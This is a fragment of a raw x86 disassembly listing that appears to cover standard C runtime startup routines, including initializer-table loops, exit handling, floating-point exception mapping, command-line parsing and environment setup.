  422ba2:	test   ecx,ecx
  422ba4:	je     0x422ba8
  422ba6:	call   ecx
  422ba8:	add    esi,0x4
  422bab:	cmp    esi,edi
  422bad:	jb     0x422b9c
  422baf:	test   eax,eax
  422bb1:	jne    0x422bdf
  422bb3:	push   0x4236ab
  422bb8:	call   0x423b30
  422bbd:	mov    esi,0x42a000
  422bc2:	mov    eax,esi
  422bc4:	mov    edi,0x42a008
  422bc9:	cmp    eax,edi
  422bcb:	pop    ecx
  422bcc:	jae    0x422bdd
  422bce:	mov    eax,DWORD PTR [esi]
  422bd0:	test   eax,eax
  422bd2:	je     0x422bd6
  422bd4:	call   eax
  422bd6:	add    esi,0x4
  422bd9:	cmp    esi,edi
  422bdb:	jb     0x422bce
  422bdd:	xor    eax,eax
  422bdf:	pop    edi
  422be0:	pop    esi
  422be1:	ret    
  422be2:	push   ebp
  422be3:	mov    ebp,esp
  422be5:	push   esi
  422be6:	push   edi
  422be7:	push   0x8
  422be9:	call   0x423a1f
  422bee:	xor    esi,esi
  422bf0:	inc    esi
  422bf1:	cmp    DWORD PTR ds:0x45cb04,esi
  422bf7:	pop    ecx
  422bf8:	jne    0x422c0a
  422bfa:	push   DWORD PTR [ebp+0x8]
  422bfd:	call   DWORD PTR ds:0x428030
  422c03:	push   eax
  422c04:	call   DWORD PTR ds:0x42802c
  422c0a:	cmp    DWORD PTR [ebp+0xc],0x0
  422c0e:	mov    al,BYTE PTR [ebp+0x10]
  422c11:	mov    DWORD PTR ds:0x45cb00,esi
  422c17:	mov    ds:0x45cafc,al
  422c1c:	jne    0x422c70
  422c1e:	mov    ecx,DWORD PTR ds:0x45d268
  422c24:	test   ecx,ecx
  422c26:	je     0x422c51
  422c28:	mov    eax,ds:0x45d264
  422c2d:	sub    eax,0x4
  422c30:	cmp    eax,ecx
  422c32:	jmp    0x422c4a
  422c34:	mov    eax,DWORD PTR [eax]
  422c36:	test   eax,eax
  422c38:	je     0x422c3c
  422c3a:	call   eax
  422c3c:	mov    eax,ds:0x45d264
  422c41:	sub    eax,0x4
  422c44:	cmp    eax,DWORD PTR ds:0x45d268
  422c4a:	mov    ds:0x45d264,eax
  422c4f:	jae    0x422c34
  422c51:	mov    eax,0x42a01c
  422c56:	mov    esi,0x42a020
  422c5b:	cmp    eax,esi
  422c5d:	mov    edi,eax
  422c5f:	jae    0x422c70
  422c61:	mov    eax,DWORD PTR [edi]
  422c63:	test   eax,eax
  422c65:	je     0x422c69
  422c67:	call   eax
  422c69:	add    edi,0x4
  422c6c:	cmp    edi,esi
  422c6e:	jb     0x422c61
  422c70:	mov    eax,0x42a024
  422c75:	mov    esi,0x42a028
  422c7a:	cmp    eax,esi
  422c7c:	mov    edi,eax
  422c7e:	jae    0x422c8f
  422c80:	mov    eax,DWORD PTR [edi]
  422c82:	test   eax,eax
  422c84:	je     0x422c88
  422c86:	call   eax
  422c88:	add    edi,0x4
  422c8b:	cmp    edi,esi
  422c8d:	jb     0x422c80
  422c8f:	cmp    DWORD PTR [ebp+0x10],0x0
  422c93:	pop    edi
  422c94:	pop    esi
  422c95:	je     0x422ca0
  422c97:	push   0x8
  422c99:	call   0x42398b
  422c9e:	jmp    0x422cb2
  422ca0:	push   DWORD PTR [ebp+0x8]
  422ca3:	mov    DWORD PTR ds:0x45cb04,0x1
  422cad:	call   0x422b3b
  422cb2:	pop    ecx
  422cb3:	pop    ebp
  422cb4:	ret    
  422cb5:	push   0x0
  422cb7:	push   0x0
  422cb9:	push   DWORD PTR [esp+0xc]
  422cbd:	call   0x422be2
  422cc2:	add    esp,0xc
  422cc5:	ret    
  422cc6:	push   0x0
  422cc8:	push   0x1
  422cca:	push   DWORD PTR [esp+0xc]
  422cce:	call   0x422be2
  422cd3:	add    esp,0xc
  422cd6:	ret    
  422cd7:	push   0x1
  422cd9:	push   0x0
  422cdb:	push   0x0
  422cdd:	call   0x422be2
  422ce2:	add    esp,0xc
  422ce5:	ret    
  422ce6:	push   0x1
  422ce8:	push   0x1
  422cea:	push   0x0
  422cec:	call   0x422be2
  422cf1:	add    esp,0xc
  422cf4:	ret    
  422cf5:	push   ebp
  422cf6:	mov    ebp,esp
  422cf8:	sub    esp,0x10c
  422cfe:	mov    eax,ds:0x45c430
  422d03:	xor    eax,DWORD PTR [ebp+0x4]
  422d06:	mov    ecx,DWORD PTR [ebp+0x8]
  422d09:	push   ebx
  422d0a:	push   esi
  422d0b:	mov    DWORD PTR [ebp-0x4],eax
  422d0e:	xor    edx,edx
  422d10:	push   edi
  422d11:	xor    eax,eax
  422d13:	cmp    ecx,DWORD PTR [eax*8+0x45c1c8]
  422d1a:	je     0x422d22
  422d1c:	inc    eax
  422d1d:	cmp    eax,0x12
  422d20:	jb     0x422d13
  422d22:	mov    esi,eax
  422d24:	shl    esi,0x3
  422d27:	cmp    ecx,DWORD PTR [esi+0x45c1c8]
  422d2d:	jne    0x422e56
  422d33:	mov    eax,ds:0x45cabc
  422d38:	cmp    eax,0x1
  422d3b:	je     0x422e31
  422d41:	cmp    eax,edx
  422d43:	jne    0x422d52
  422d45:	cmp    DWORD PTR ds:0x45c1c4,0x1
  422d4c:	je     0x422e31
  422d52:	cmp    ecx,0xfc
  422d58:	je     0x422e56
  422d5e:	push   0x104
  422d63:	lea    eax,[ebp-0x10c]
  422d69:	push   eax
  422d6a:	push   edx
  422d6b:	mov    BYTE PTR [ebp-0x8],dl
  422d6e:	call   DWORD PTR ds:0x42803c
  422d74:	test   eax,eax
  422d76:	jne    0x422d8b
  422d78:	lea    eax,[ebp-0x10c]
  422d7e:	push   0x428484
  422d83:	push   eax
  422d84:	call   0x423c40
  422d89:	pop    ecx
  422d8a:	pop    ecx
  422d8b:	lea    eax,[ebp-0x10c]
  422d91:	push   eax
  422d92:	lea    edi,[ebp-0x10c]
  422d98:	call   0x423e70
  422d9d:	inc    eax
  422d9e:	cmp    eax,0x3c
  422da1:	pop    ecx
  422da2:	jbe    0x422dcd
  422da4:	lea    eax,[ebp-0x10c]
  422daa:	push   eax
  422dab:	call   0x423e70
  422db0:	mov    edi,eax
  422db2:	lea    eax,[ebp-0x10c]
  422db8:	sub    eax,0x3b
  422dbb:	push   0x3
  422dbd:	add    edi,eax
  422dbf:	push   0x428480
  422dc4:	push   edi
  422dc5:	call   0x423d40
  422dca:	add    esp,0x10
  422dcd:	push   edi
  422dce:	call   0x423e70
  422dd3:	push   DWORD PTR [esi+0x45c1cc]
  422dd9:	mov    ebx,eax
  422ddb:	call   0x423e70
  422de0:	lea    eax,[ebx+eax*1+0x1c]
  422de4:	pop    ecx
  422de5:	add    eax,0x3
  422de8:	pop    ecx
  422de9:	and    eax,0xfffffffc
  422dec:	call   0x4238b0
  422df1:	mov    ebx,esp
  422df3:	push   0x428464
  422df8:	push   ebx
  422df9:	call   0x423c40
  422dfe:	push   edi
  422dff:	push   ebx
  422e00:	call   0x423c50
  422e05:	push   0x428460
  422e0a:	push   ebx
  422e0b:	call   0x423c50
  422e10:	push   DWORD PTR [esi+0x45c1cc]
  422e16:	push   ebx
  422e17:	call   0x423c50
  422e1c:	push   0x12010
  422e21:	push   0x428438
  422e26:	push   ebx
  422e27:	call   0x423b42
  422e2c:	add    esp,0x2c
  422e2f:	jmp    0x422e56
  422e31:	push   edx
  422e32:	lea    eax,[ebp+0x8]
  422e35:	push   eax
  422e36:	lea    esi,[esi+0x45c1cc]
  422e3c:	push   DWORD PTR [esi]
  422e3e:	call   0x423e70
  422e43:	pop    ecx
  422e44:	push   eax
  422e45:	push   DWORD PTR [esi]
  422e47:	push   0xfffffff4
  422e49:	call   DWORD PTR ds:0x428038
  422e4f:	push   eax
  422e50:	call   DWORD PTR ds:0x428034
  422e56:	lea    esp,[ebp-0x118]
  422e5c:	mov    ecx,DWORD PTR [ebp-0x4]
  422e5f:	xor    ecx,DWORD PTR [ebp+0x4]
  422e62:	call   0x423f2c
  422e67:	pop    edi
  422e68:	pop    esi
  422e69:	pop    ebx
  422e6a:	leave  
  422e6b:	ret    
  422e6c:	mov    eax,ds:0x45cabc
  422e71:	cmp    eax,0x1
  422e74:	je     0x422e83
  422e76:	test   eax,eax
  422e78:	jne    0x422ea4
  422e7a:	cmp    DWORD PTR ds:0x45c1c4,0x1
  422e81:	jne    0x422ea4
  422e83:	push   0xfc
  422e88:	call   0x422cf5
  422e8d:	mov    eax,ds:0x45cb08
  422e92:	test   eax,eax
  422e94:	pop    ecx
  422e95:	je     0x422e99
  422e97:	call   eax
  422e99:	push   0xff
  422e9e:	call   0x422cf5
  422ea3:	pop    ecx
  422ea4:	ret    
  422ea5:	push   ebp
  422ea6:	mov    ebp,esp
  422ea8:	push   ecx
  422ea9:	push   ebx
  422eaa:	push   esi
  422eab:	push   edi
  422eac:	call   0x42370d
  422eb1:	mov    edi,DWORD PTR [ebp+0x8]
  422eb4:	mov    esi,eax
  422eb6:	mov    edx,DWORD PTR [esi+0x54]
  422eb9:	mov    eax,ds:0x45c2dc
  422ebe:	mov    ecx,edx
  422ec0:	cmp    DWORD PTR [ecx],edi
  422ec2:	je     0x422ed1
  422ec4:	lea    ebx,[eax+eax*2]
  422ec7:	add    ecx,0xc
  422eca:	lea    ebx,[edx+ebx*4]
  422ecd:	cmp    ecx,ebx
  422ecf:	jb     0x422ec0
  422ed1:	lea    eax,[eax+eax*2]
  422ed4:	lea    eax,[edx+eax*4]
  422ed7:	cmp    ecx,eax
  422ed9:	jae    0x422edf
  422edb:	cmp    DWORD PTR [ecx],edi
  422edd:	je     0x422ee1
  422edf:	xor    ecx,ecx
  422ee1:	test   ecx,ecx
  422ee3:	je     0x422ffb
  422ee9:	mov    ebx,DWORD PTR [ecx+0x8]
  422eec:	test   ebx,ebx
  422eee:	mov    DWORD PTR [ebp+0x8],ebx
  422ef1:	je     0x422ffb
  422ef7:	cmp    ebx,0x5
  422efa:	jne    0x422f08
  422efc:	and    DWORD PTR [ecx+0x8],0x0
  422f00:	xor    eax,eax
  422f02:	inc    eax
  422f03:	jmp    0x423004
  422f08:	cmp    ebx,0x1
  422f0b:	je     0x422ff6
  422f11:	mov    eax,DWORD PTR [esi+0x58]
  422f14:	mov    DWORD PTR [ebp-0x4],eax
  422f17:	mov    eax,DWORD PTR [ebp+0xc]
  422f1a:	mov    DWORD PTR [esi+0x58],eax
  422f1d:	mov    eax,DWORD PTR [ecx+0x4]
  422f20:	cmp    eax,0x8
  422f23:	jne    0x422fe8
  422f29:	mov    edx,DWORD PTR ds:0x45c2d0
  422f2f:	mov    eax,ds:0x45c2d4
  422f34:	add    eax,edx
  422f36:	cmp    edx,eax
  422f38:	jge    0x422f61
  422f3a:	lea    eax,[edx+edx*2]
  422f3d:	shl    eax,0x2
  422f40:	mov    edi,DWORD PTR [esi+0x54]
  422f43:	and    DWORD PTR [eax+edi*1+0x8],0x0
  422f48:	mov    edi,DWORD PTR ds:0x45c2d0
  422f4e:	mov    ebx,DWORD PTR ds:0x45c2d4
  422f54:	inc    edx
  422f55:	add    ebx,edi
  422f57:	add    eax,0xc
  422f5a:	cmp    edx,ebx
  422f5c:	jl     0x422f40
  422f5e:	mov    ebx,DWORD PTR [ebp+0x8]
  422f61:	mov    ecx,DWORD PTR [ecx]
  422f63:	cmp    ecx,0xc000008e
  422f69:	mov    edi,DWORD PTR [esi+0x5c]
  422f6c:	jne    0x422f77
  422f6e:	mov    DWORD PTR [esi+0x5c],0x83
  422f75:	jmp    0x422fdb
  422f77:	cmp    ecx,0xc0000090
  422f7d:	jne    0x422f88
  422f7f:	mov    DWORD PTR [esi+0x5c],0x81
  422f86:	jmp    0x422fdb
  422f88:	cmp    ecx,0xc0000091
  422f8e:	jne    0x422f99
  422f90:	mov    DWORD PTR [esi+0x5c],0x84
  422f97:	jmp    0x422fdb
  422f99:	cmp    ecx,0xc0000093
  422f9f:	jne    0x422faa
  422fa1:	mov    DWORD PTR [esi+0x5c],0x85
  422fa8:	jmp    0x422fdb
  422faa:	cmp    ecx,0xc000008d
  422fb0:	jne    0x422fbb
  422fb2:	mov    DWORD PTR [esi+0x5c],0x82
  422fb9:	jmp    0x422fdb
  422fbb:	cmp    ecx,0xc000008f
  422fc1:	jne    0x422fcc
  422fc3:	mov    DWORD PTR [esi+0x5c],0x86
  422fca:	jmp    0x422fdb
  422fcc:	cmp    ecx,0xc0000092
  422fd2:	jne    0x422fdb
  422fd4:	mov    DWORD PTR [esi+0x5c],0x8a
  422fdb:	push   DWORD PTR [esi+0x5c]
  422fde:	push   0x8
  422fe0:	call   ebx
  422fe2:	pop    ecx
  422fe3:	mov    DWORD PTR [esi+0x5c],edi
  422fe6:	jmp    0x422fef
  422fe8:	and    DWORD PTR [ecx+0x8],0x0
  422fec:	push   eax
  422fed:	call   ebx
  422fef:	mov    eax,DWORD PTR [ebp-0x4]
  422ff2:	pop    ecx
  422ff3:	mov    DWORD PTR [esi+0x58],eax
  422ff6:	or     eax,0xffffffff
  422ff9:	jmp    0x423004
  422ffb:	push   DWORD PTR [ebp+0xc]
  422ffe:	call   DWORD PTR ds:0x428040
  423004:	pop    edi
  423005:	pop    esi
  423006:	pop    ebx
  423007:	leave  
  423008:	ret    
  423009:	cmp    DWORD PTR ds:0x45d26c,0x0
  423010:	jne    0x423017
  423012:	call   0x42444c
  423017:	push   esi
  423018:	mov    esi,DWORD PTR ds:0x45d274
  42301e:	test   esi,esi
  423020:	jne    0x423029
  423022:	mov    esi,0x42849b
  423027:	jmp    0x42306e
  423029:	mov    al,BYTE PTR [esi]
  42302b:	cmp    al,0x22
  42302d:	jne    0x423057
  42302f:	inc    esi
  423030:	mov    al,BYTE PTR [esi]
  423032:	cmp    al,0x22
  423034:	je     0x423067
  423036:	test   al,al
  423038:	je     0x423050
  42303a:	movzx  eax,al
  42303d:	push   eax
  42303e:	call   0x423f6b
  423043:	test   eax,eax
  423045:	pop    ecx
  423046:	je     0x423049
  423048:	inc    esi
  423049:	inc    esi
  42304a:	mov    al,BYTE PTR [esi]
  42304c:	cmp    al,0x22
  42304e:	jne    0x423036
  423050:	cmp    BYTE PTR [esi],0x22
  423053:	jne    0x423068
  423055:	jmp    0x423067
  423057:	cmp    al,0x20
  423059:	jbe    0x423068
  42305b:	inc    esi
  42305c:	cmp    BYTE PTR [esi],0x20
  42305f:	ja     0x42305b
  423061:	jmp    0x423068
  423063:	cmp    al,0x20
  423065:	ja     0x42306e
  423067:	inc    esi
  423068:	mov    al,BYTE PTR [esi]
  42306a:	test   al,al
  42306c:	jne    0x423063
  42306e:	mov    eax,esi
  423070:	pop    esi
  423071:	ret    
  423072:	push   ebx
  423073:	xor    ebx,ebx
  423075:	cmp    DWORD PTR ds:0x45d26c,ebx
  42307b:	push   esi
  42307c:	push   edi
  42307d:	jne    0x423084
  42307f:	call   0x42444c
  423084:	mov    esi,DWORD PTR ds:0x45cab4
  42308a:	xor    edi,edi
  42308c:	cmp    esi,ebx
  42308e:	jne    0x4230a2
  423090:	jmp    0x4230c2
  423092:	cmp    al,0x3d
  423094:	je     0x423097
  423096:	inc    edi
  423097:	push   esi
  423098:	call   0x423e70
  42309d:	pop    ecx
  42309e:	lea    esi,[esi+eax*1+0x1]
  4230a2:	mov    al,BYTE PTR [esi]
  4230a4:	cmp    al,bl
  4230a6:	jne    0x423092
  4230a8:	lea    eax,[edi*4+0x4]
  4230af:	push   eax
  4230b0:	call   0x424582
  4230b5:	mov    edi,eax
  4230b7:	cmp    edi,ebx
  4230b9:	pop    ecx
  4230ba:	mov    DWORD PTR ds:0x45cae4,edi
  4230c0:	jne    0x4230c7
  4230c2:	or     eax,0xffffffff
  4230c5:	jmp    0x42311f
  4230c7:	mov    esi,DWORD PTR ds:0x45cab4
  4230cd:	push   ebp
  4230ce:	jmp    0x4230fa
  4230d0:	push   esi
  4230d1:	call   0x423e70
  4230d6:	mov    ebp,eax
  4230d8:	inc    ebp
  4230d9:	cmp    BYTE PTR [esi],0x3d
  4230dc:	pop    ecx
  4230dd:	je     0x4230f8
  4230df:	push   ebp
  4230e0:	call   0x424582
  4230e5:	cmp    eax,ebx
  4230e7:	pop    ecx
  4230e8:	mov    DWORD PTR [edi],eax
  4230ea:	je     0x423123
  4230ec:	push   esi
  4230ed:	push   eax
  4230ee:	call   0x423c40
  4230f3:	pop    ecx
  4230f4:	pop    ecx
  4230f5:	add    edi,0x4
  4230f8:	add    esi,ebp
  4230fa:	cmp    BYTE PTR [esi],bl
  4230fc:	jne    0x4230d0
  4230fe:	push   DWORD PTR ds:0x45cab4
  423104:	call   0x42446a
  423109:	mov    DWORD PTR ds:0x45cab4,ebx
  42310f:	mov    DWORD PTR [edi],ebx
  423111:	mov    DWORD PTR ds:0x45d260,0x1
  42311b:	xor    eax,eax
  42311d:	pop    ecx
  42311e:	pop    ebp
  42311f:	pop    edi
  423120:	pop    esi
  423121:	pop    ebx
  423122:	ret    
  423123:	push   DWORD PTR ds:0x45cae4
  423129:	call   0x42446a
  42312e:	mov    DWORD PTR ds:0x45cae4,ebx
  423134:	or     eax,0xffffffff
  423137:	jmp    0x42311d
  423139:	push   ebp
  42313a:	mov    ebp,esp
  42313c:	push   ecx
  42313d:	push   ebx
  42313e:	mov    ebx,DWORD PTR [ebp+0xc]
  423141:	xor    edx,edx
  423143:	cmp    DWORD PTR [ebp+0x8],edx
  423146:	push   edi
  423147:	mov    DWORD PTR [esi],edx
  423149:	mov    edi,ecx
  42314b:	mov    DWORD PTR [ebx],0x1
  423151:	je     0x42315c
  423153:	mov    ecx,DWORD PTR [ebp+0x8]
  423156:	add    DWORD PTR [ebp+0x8],0x4
  42315a:	mov    DWORD PTR [ecx],edi
  42315c:	cmp    BYTE PTR [eax],0x22
  42315f:	jne    0x42316f
  423161:	xor    ecx,ecx
  423163:	test   edx,edx
  423165:	sete   cl
  423168:	inc    eax
  423169:	mov    edx,ecx
  42316b:	mov    cl,0x22
  42316d:	jmp    0x42319c
  42316f:	inc    DWORD PTR [esi]
  423171:	test   edi,edi
  423173:	je     0x42317a
  423175:	mov    cl,BYTE PTR [eax]
  423177:	mov    BYTE PTR [edi],cl
  423179:	inc    edi
  42317a:	mov    cl,BYTE PTR [eax]
  42317c:	movzx  ebx,cl
  42317f:	inc    eax
  423180:	test   BYTE PTR [ebx+0x45cf21],0x4
  423187:	je     0x423195
  423189:	inc    DWORD PTR [esi]
  42318b:	test   edi,edi
  42318d:	je     0x423194
  42318f:	mov    bl,BYTE PTR [eax]
  423191:	mov    BYTE PTR [edi],bl
  423193:	inc    edi
  423194:	inc    eax
  423195:	test   cl,cl
  423197:	mov    ebx,DWORD PTR [ebp+0xc]
  42319a:	je     0x4231ce
  42319c:	test   edx,edx
  42319e:	jne    0x42315c
  4231a0:	cmp    cl,0x20
  4231a3:	je     0x4231aa
  4231a5:	cmp    cl,0x9
  4231a8:	jne    0x42315c
  4231aa:	test   edi,edi
  4231ac:	je     0x4231b2
  4231ae:	and    BYTE PTR [edi-0x1],0x0
  4231b2:	and    DWORD PTR [ebp-0x4],0x0
  4231b6:	cmp    BYTE PTR [eax],0x0
  4231b9:	je     0x423295
  4231bf:	mov    cl,BYTE PTR [eax]
  4231c1:	cmp    cl,0x20
  4231c4:	je     0x4231cb
  4231c6:	cmp    cl,0x9
  4231c9:	jne    0x4231d1
  4231cb:	inc    eax
  4231cc:	jmp    0x4231bf
  4231ce:	dec    eax
  4231cf:	jmp    0x4231b2
  4231d1:	cmp    BYTE PTR [eax],0x0
  4231d4:	je     0x423295
  4231da:	cmp    DWORD PTR [ebp+0x8],0x0
  4231de:	je     0x4231e9
  4231e0:	mov    ecx,DWORD PTR [ebp+0x8]
  4231e3:	add    DWORD PTR [ebp+0x8],0x4
  4231e7:	mov    DWORD PTR [ecx],edi
  4231e9:	inc    DWORD PTR [ebx]
  4231eb:	xor    ebx,ebx
  4231ed:	inc    ebx
  4231ee:	xor    edx,edx
  4231f0:	jmp    0x4231f4
  4231f2:	inc    eax
  4231f3:	inc    edx
  4231f4:	cmp    BYTE PTR [eax],0x5c
  4231f7:	je     0x4231f2
  4231f9:	cmp    BYTE PTR [eax],0x22
  4231fc:	jne    0x423224
  4231fe:	test   dl,0x1
  423201:	jne    0x423222
  423203:	cmp    DWORD PTR [ebp-0x4],0x0
  423207:	je     0x423215
  423209:	lea    ecx,[eax+0x1]
  42320c:	cmp    BYTE PTR [ecx],0x22
  42320f:	jne    0x423215
  423211:	mov    eax,ecx
  423213:	jmp    0x423217
  423215:	xor    ebx,ebx
  423217:	xor    ecx,ecx
  423219:	cmp    DWORD PTR [ebp-0x4],ecx
  42321c:	sete   cl
  42321f:	mov    DWORD PTR [ebp-0x4],ecx
  423222:	shr    edx,1
  423224:	test   edx,edx
  423226:	je     0x423235
  423228:	test   edi,edi
  42322a:	je     0x423230
  42322c:	mov    BYTE PTR [edi],0x5c
  42322f:	inc    edi
  423230:	inc    DWORD PTR [esi]
  423232:	dec    edx
  423233:	jne    0x423228
  423235:	mov    cl,BYTE PTR [eax]
  423237:	test   cl,cl
  423239:	je     0x423283
  42323b:	cmp    DWORD PTR [ebp-0x4],0x0
  42323f:	jne    0x42324b
  423241:	cmp    cl,0x20
  423244:	je     0x423283
  423246:	cmp    cl,0x9
  423249:	je     0x423283
  42324b:	test   ebx,ebx
  42324d:	je     0x42327d
  42324f:	test   edi,edi
  423251:	je     0x42326c
  423253:	movzx  edx,cl
  423256:	test   BYTE PTR [edx+0x45cf21],0x4
  42325d:	je     0x423265
  42325f:	mov    BYTE PTR [edi],cl
  423261:	inc    edi
  423262:	inc    eax
  423263:	inc    DWORD PTR [esi]
  423265:	mov    cl,BYTE PTR [eax]
  423267:	mov    BYTE PTR [edi],cl
  423269:	inc    edi
  42326a:	jmp    0x42327b
  42326c:	movzx  ecx,cl
  42326f:	test   BYTE PTR [ecx+0x45cf21],0x4
  423276:	je     0x42327b
  423278:	inc    eax
  423279:	inc    DWORD PTR [esi]
  42327b:	inc    DWORD PTR [esi]
  42327d:	inc    eax
  42327e:	jmp    0x4231eb
  423283:	test   edi,edi
  423285:	je     0x42328b
  423287:	and    BYTE PTR [edi],0x0
  42328a:	inc    edi
  42328b:	inc    DWORD PTR [esi]
  42328d:	mov    ebx,DWORD PTR [ebp+0xc]
  423290:	jmp    0x4231b6
  423295:	mov    eax,DWORD PTR [ebp+0x8]
  423298:	test   eax,eax
  42329a:	je     0x42329f
  42329c:	and    DWORD PTR [eax],0x0
  42329f:	inc    DWORD PTR [ebx]
  4232a1:	pop    edi
  4232a2:	pop    ebx
  4232a3:	leave  
  4232a4:	ret    
  4232a5:	push   ebp
  4232a6:	mov    ebp,esp
  4232a8:	push   ecx
  4232a9:	push   ecx
  4232aa:	push   ebx
  4232ab:	push   esi
  4232ac:	push   edi
  4232ad:	xor    edi,edi
  4232af:	cmp    DWORD PTR ds:0x45d26c,edi
  4232b5:	jne    0x4232bc
  4232b7:	call   0x42444c
  4232bc:	and    BYTE PTR ds:0x45cc14,0x0
  4232c3:	push   0x104
  4232c8:	mov    esi,0x45cb10
  4232cd:	push   esi
  4232ce:	push   edi
  4232cf:	call   DWORD PTR ds:0x42803c
  4232d5:	mov    eax,ds:0x45d274
  4232da:	cmp    eax,edi
  4232dc:	mov    DWORD PTR ds:0x45caf4,esi
  4232e2:	je     0x4232eb
  4232e4:	cmp    BYTE PTR [eax],0x0
  4232e7:	mov    ebx,eax
  4232e9:	jne    0x4232ed
  4232eb:	mov    ebx,esi
  4232ed:	lea    eax,[ebp-0x4]
  4232f0:	push   eax
  4232f1:	push   edi
  4232f2:	lea    esi,[ebp-0x8]
  4232f5:	xor    ecx,ecx
  4232f7:	mov    eax,ebx
  4232f9:	call   0x423139
  4232fe:	mov    esi,DWORD PTR [ebp-0x4]
  423301:	mov    eax,DWORD PTR [ebp-0x8]
  423304:	shl    esi,0x2
  423307:	add    eax,esi
  423309:	push   eax
  42330a:	call   0x424582
  42330f:	mov    edi,eax
  423311:	add    esp,0xc
  423314:	test   edi,edi
  423316:	jne    0x42331d
  423318:	or     eax,0xffffffff
  42331b:	jmp    0x423342
  42331d:	lea    eax,[ebp-0x4]
  423320:	push   eax
  423321:	lea    ecx,[esi+edi*1]
  423324:	push   edi
  423325:	lea    esi,[ebp-0x8]
  423328:	mov    eax,ebx
  42332a:	call   0x423139
  42332f:	mov    eax,DWORD PTR [ebp-0x4]
  423332:	dec    eax
  423333:	pop    ecx
  423334:	mov    ds:0x45cad8,eax
  423339:	pop    ecx
  42333a:	mov    DWORD PTR ds:0x45cadc,edi
  423340:	xor    eax,eax
  423342:	pop    edi
  423343:	pop    esi
  423344:	pop    ebx
  423345:	leave  
  423346:	ret    
  423347:	push   ecx
  423348:	push   ecx
  423349:	mov    eax,ds:0x45cc18
  42334e:	push   ebx
  42334f:	push   ebp
  423350:	push   esi
  423351:	push   edi
  423352:	mov    edi,DWORD PTR ds:0x428054
  423358:	xor    ebx,ebx
  42335a:	xor    esi,esi
  42335c:	cmp    eax,ebx
  42335e:	push   0x2
  423360:	pop    ebp
  423361:	jne    0x423390
  423363:	call   edi
  423365:	mov    esi,eax
  423367:	cmp    esi,ebx
  423369:	je     0x423377
  42336b:	mov    DWORD PTR ds:0x45cc18,0x1
  423375:	jmp    0x423395
  423377:	call   DWORD PTR ds:0x428010
  42337d:	cmp    eax,0x78
  423380:	jne    0x42338b
  423382:	mov    eax,ebp
  423384:	mov    ds:0x45cc18,eax
  423389:	jmp    0x423390
  42338b:	mov    eax,ds:0x45cc18
  423390:	cmp    eax,0x1
  423393:	jne    0x423412
  423395:	cmp    esi,ebx
  423397:	jne    0x4233a1
  423399:	call   edi
  42339b:	mov    esi,eax
  42339d:	cmp    esi,ebx
  42339f:	je     0x42341a
  4233a1:	cmp    WORD PTR [esi],bx
  4233a4:	mov    eax,esi
  4233a6:	je     0x4233b6
  4233a8:	add    eax,ebp
  4233aa:	cmp    WORD PTR [eax],bx
  4233ad:	jne    0x4233a8
  4233af:	add    eax,ebp
  4233b1:	cmp    WORD PTR [eax],bx
  4233b4:	jne    0x4233a8
  4233b6:	mov    edi,DWORD PTR ds:0x428050
  4233bc:	push   ebx
  4233bd:	push   ebx
  4233be:	push   ebx
  4233bf:	sub    eax,esi
  4233c1:	push   ebx
  4233c2:	sar    eax,1
  4233c4:	inc    eax
  4233c5:	push   eax
  4233c6:	push   esi
  4233c7:	push   ebx
  4233c8:	push   ebx
  4233c9:	mov    DWORD PTR [esp+0x34],eax
  4233cd:	call   edi
  4233cf:	mov    ebp,eax
  4233d1:	cmp    ebp,ebx
  4233d3:	je     0x423407
  4233d5:	push   ebp
  4233d6:	call   0x424582
  4233db:	cmp    eax,ebx
  4233dd:	pop    ecx
  4233de:	mov    DWORD PTR [esp+0x10],eax
  4233e2:	je     0x423407
  4233e4:	push   ebx
  4233e5:	push   ebx
  4233e6:	push   ebp
  4233e7:	push   eax
  4233e8:	push   DWORD PTR [esp+0x24]
  4233ec:	push   esi
  4233ed:	push   ebx
  4233ee:	push   ebx
  4233ef:	call   edi
  4233f1:	test   eax,eax
  4233f3:	jne    0x423403
  4233f5:	push   DWORD PTR [esp+0x10]
  4233f9:	call   0x42446a
  4233fe:	pop    ecx
  4233ff:	mov    DWORD PTR [esp+0x10],ebx
  423403:	mov    ebx,DWORD PTR [esp+0x10]
  423407:	push   esi
  423408:	call   DWORD PTR ds:0x42804c
  42340e:	mov    eax,ebx
  423410:	jmp    0x423462
  423412:	cmp    eax,ebp
  423414:	je     0x42341e
  423416:	cmp    eax,ebx
  423418:	je     0x42341e
  42341a:	xor    eax,eax
  42341c:	jmp    0x423462
  42341e:	call   DWORD PTR ds:0x428048
  423424:	mov    esi,eax
  423426:	cmp    esi,ebx
  423428:	je     0x42341a
  42342a:	cmp    BYTE PTR [esi],bl
  42342c:	je     0x423438
  42342e:	inc    eax
  42342f:	cmp    BYTE PTR [eax],bl
  423431:	jne    0x42342e
  423433:	inc    eax
  423434:	cmp    BYTE PTR [eax],bl
  423436:	jne    0x42342e
  423438:	sub    eax,esi
  42343a:	inc    eax
  42343b:	mov    ebp,eax
  42343d:	push   ebp
  42343e:	call   0x424582
  423443:	mov    edi,eax
  423445:	cmp    edi,ebx
  423447:	pop    ecx
  423448:	jne    0x42344e
  42344a:	xor    edi,edi
  42344c:	jmp    0x423459
  42344e:	push   ebp
  42344f:	push   esi
  423450:	push   edi
  423451:	call   0x4245a0
  423456:	add    esp,0xc
  423459:	push   esi
  42345a:	call   DWORD PTR ds:0x428044
  423460:	mov    eax,edi
  423462:	pop    edi
  423463:	pop    esi
  423464:	pop    ebp
  423465:	pop    ebx
  423466:	pop    ecx
  423467:	pop    ecx
  423468:	ret    
  423469:	sub    esp,0x48
  42346c:	push   ebx
  42346d:	mov    ebx,0x480
  423472:	push   ebx
  423473:	call   0x424582
  423478:	test   eax,eax
  42347a:	pop    ecx
  42347b:	jne    0x423485
  42347d:	or     eax,0xffffffff
  423480:	jmp    0x423662
  423485:	mov    ds:0x45d160,eax
  42348a:	mov    DWORD PTR ds:0x45d148,0x20
  423494:	lea    ecx,[eax+0x480]
  42349a:	jmp    0x4234ba
  42349c:	and    BYTE PTR [eax+0x4],0x0
  4234a0:	or     DWORD PTR [eax],0xffffffff
  4234a3:	and    DWORD PTR [eax+0x8],0x0
  4234a7:	mov    BYTE PTR [eax+0x5],0xa
  4234ab:	mov    ecx,DWORD PTR ds:0x45d160
  4234b1:	add    eax,0x24
  4234b4:	add    ecx,0x480
  4234ba:	cmp    eax,ecx
  4234bc:	jb     0x42349c
  4234be:	push   ebp
  4234bf:	push   esi
  4234c0:	push   edi
  4234c1:	lea    eax,[esp+0x14]
  4234c5:	push   eax
  4234c6:	call   DWORD PTR ds:0x42801c
  4234cc:	cmp    WORD PTR [esp+0x46],0x0
